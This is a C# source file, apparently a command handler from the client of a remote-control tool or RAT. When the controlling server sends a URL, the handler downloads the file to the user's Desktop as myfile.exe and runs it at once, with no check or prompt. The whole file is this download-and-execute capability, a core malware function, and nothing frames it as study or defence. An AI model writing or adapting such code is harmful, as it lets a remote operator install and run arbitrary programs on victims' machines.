namespace ClientCore.Handle
{
    using Arrowgene.Services.Network.ManagedConnection.Client;
    using NetworkObjects;
    using System;
    using System.Diagnostics;
    using System.Net;

    public class HandleDownloadExec : IHandlePacket
    {
        public void Handle(object receivedClass, ClientSocket serverSocket)
        {
            string downloadExec = (string)receivedClass;

            String DesktopPath;
            DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            WebClient Client = new WebClient();
            Client.DownloadFile(downloadExec, DesktopPath + "/myfile.exe");
            Process.Start(DesktopPath + "/myfile.exe");
        }
    }
}
